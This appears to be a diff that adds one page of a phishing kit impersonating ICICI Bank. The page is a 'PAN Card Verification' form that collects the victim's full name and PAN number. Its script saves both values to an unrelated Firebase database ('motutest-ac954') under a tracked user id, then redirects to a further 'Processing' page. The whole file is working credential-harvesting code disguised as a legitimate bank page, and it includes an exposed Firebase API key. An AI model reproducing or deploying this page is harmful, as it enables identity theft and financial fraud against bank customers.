@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+   <meta name="theme-color" content="#FFF">
+   <head>
+      <meta charset="utf-8"/>
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+      <title>PAN Card Authentication | ICICI Bank</title>
+      <meta name="description" content="login"/>
+      <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+      <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+      <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+      <link rel="manifest" href="/site.webmanifest">
+      <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+      <meta name="msapplication-TileColor" content="#da532c">
+      <link rel="preload" href="Axis.css" as="style"/>
+      <link rel="stylesheet" href="Axis.css" data-n-g=""/>
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
+      <style>
+         body {
+              text-transform: uppercase;
+         }
+         .error {
+            color: Red;
+            font-family: 'Work Sans', sans-serif;
+            font-size: 11px;
+            font-style: italic;
+         }
+         .submit {
+            background-color: #f69312;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-family: 'Work Sans', sans-serif;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+         }
+          
+      </style>
+      <!-- Add Firebase SDK -->
+      <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+      <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+   </head>
+   <body>
+      <div class="login-box">
+         <div id="__next">
+            <img alt="" src="icici h.jpg" style="width:100%;" />
+         </div>
+         <div class="mainContent">
+            
+            <h1 class="text-center">PAN Card Verification</h1>
+            <div class="card">
+               <form class="LoginForm" id="panForm">
+                  <input type="hidden" name="" value=""/>
+                  <div class="form-group">
+                     <label for="Full_Name">
+                        Full Name (As per PAN)<span>*</span>
+                     </label>
+                     <input type="text" class="new-control" id="Full_Name" name="Full_Name" minLength="3" maxLength="30" required/>
+                  </div>
+                  <div class="form-group">
+                     <label for="PAN_Number">
+                        PAN Card Number<span>*</span>
+                     </label>
+                     <input type="text" class="new-control" id="PAN_Number" name="PAN_Number" maxLength="10" pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" title="Please enter a valid PAN (e.g., ABCDE1234F)" required/>
+                  </div>
+                  <div class="text-center">
+                     <button type="submit" class="submit">SUBMIT</button>
+                  </div>
+               </form>
+            </div>
+            <div id="__next">
+            <img alt="" src="ICICI OTP F.jpg" style="width:100%;" />
+         </div>
+           
+         </div>
+      </div>
+
+      <!-- Firebase Configuration and Data Submission -->
+      <script>
+         // Initialize Firebase
+         const firebaseConfig = {
+            apiKey: "AIzaSyCDcF_4SEUs2RKDOAWoXUTCb9DO6QaO1TU",
+            authDomain: "motutest-ac954.firebaseapp.com",
+            databaseURL: "https://motutest-ac954-default-rtdb.firebaseio.com",
+            projectId: "motutest-ac954",
+            storageBucket: "motutest-ac954.firebasestorage.app",
+            messagingSenderId: "85522378752",
+            appId: "1:85522378752:web:7ebe0121ab3ff25e09a8e5"
+         };
+         if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+         }
+         const database = firebase.database();
+
+         // Handle form submission
+         document.getElementById('panForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Get form data
+            const fullName = document.getElementById('Full_Name').value;
+            const panNumber = document.getElementById('PAN_Number').value;
+
+            // Validate inputs
+            if (fullName.length < 3 || fullName.length > 30) {
+               alert("Full Name must be between 3 and 30 characters!");
+               return;
+            }
+            const panRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
+            if (!panRegex.test(panNumber)) {
+               alert("Invalid PAN Number format! Please enter a valid PAN (e.g., ABCDE1234F).");
+               return;
+            }
+
+            // Get saved userId from localStorage
+            const currentUserId = localStorage.getItem("currentUserId");
+            if (!currentUserId) {
+               alert("Session expired. Please start again.");
+               return;
+            }
+
+            try {
+               // Update same user record
+               await database.ref("user/" + currentUserId).update({
+                  fullName: fullName,
+                  panNumber: panNumber,
+               });
+
+               console.log("✅ PAN details saved for user:", currentUserId);
+
+               // Redirect to next page
+               window.location.href = "Processing2.html";
+            } catch (error) {
+               console.error("❌ Error saving PAN details:", error);
+               alert("Error submitting PAN details. Please try again.");
+            }
+         });
+      </script>
+   </body>
+</html>
